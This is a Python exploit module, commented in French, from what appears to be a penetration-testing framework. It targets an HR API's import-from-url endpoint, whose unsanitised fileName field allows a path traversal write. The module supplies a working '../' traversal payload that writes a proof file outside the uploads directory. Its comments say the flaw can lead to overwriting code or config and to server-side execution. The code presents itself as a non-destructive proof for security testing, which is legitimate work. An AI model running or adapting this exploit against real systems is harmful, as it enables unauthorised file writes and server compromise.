"""HRAPI-2026-026 — ecriture de fichier hors du dossier d'upload (path traversal).

Demonstration NON destructive : on ecrit un fichier temoin dans un emplacement
benin pour prouver que le chemin sort de storage/uploads. On n'ecrase AUCUN
fichier applicatif. Le `fileName` n'etant valide qu'en longueur, path.join
normalise les sequences de remontee.
"""

from __future__ import annotations
from .base import Module, Option, Context


class Exploit(Module):
    id = "HRAPI-2026-026"
    name = "documents/path_traversal_write"
    cwe = "CWE-22"
    cvss = "9.1 (Critique)"
    description = (
        "Le champ fileName d'import-from-url n'est pas assaini : des sequences "
        "'../' font sortir l'ecriture de storage/uploads. Preuve non destructive "
        "par ecriture d'un fichier temoin dans un emplacement benin."
    )
    options = {
        "url": Option(
            default="http://127.0.0.1:4000/api/v1/",
            help="source du contenu ecrit (URL recuperee par le serveur)",
        ),
        "filename": Option(
            default="../../../hrapi_traversal_proof.txt",
            help="chemin relatif avec remontee (temoin benin, hors de uploads/)",
        ),
    }

    def run(self, ctx: Context) -> bool:
        access = ctx.store.get("ACCESS")
        if not access:
            ctx.fail("Pas de session. Lance d'abord HRAPI-2026-001.")
            return False

        fn = self.opt(ctx.store, "filename")
        url = self.opt(ctx.store, "url")
        ctx.info(f"fileName soumis (non assaini) : {fn}")
        res = ctx.client.import_from_url(access, {"url": url, "fileName": fn})
        doc = res.get("data", {})
        if res.get("status", 500) >= 400 or not doc.get("id"):
            ctx.fail(f"Import refuse (status={res.get('status')}). Detail: {res.get('error')}")
            return False

        stored = doc.get("storagePath", "")
        ctx.ok(f"Document cree. storagePath enregistre : {stored}")
        if not stored.startswith("uploads/") or ".." in stored or stored.startswith("/"):
            ctx.ok("Chemin HORS de uploads/ : la traversee a reussi (ecriture echappee).")
        else:
            ctx.info("storagePath reste dans uploads/ : ajuste la profondeur de 'filename'.")
        ctx.info("En conditions reelles : ecrasement de code/config -> execution cote serveur.")
        ctx.store.setdefault("ARTIFACTS", []).append(("Document", doc.get("id")))
        return True
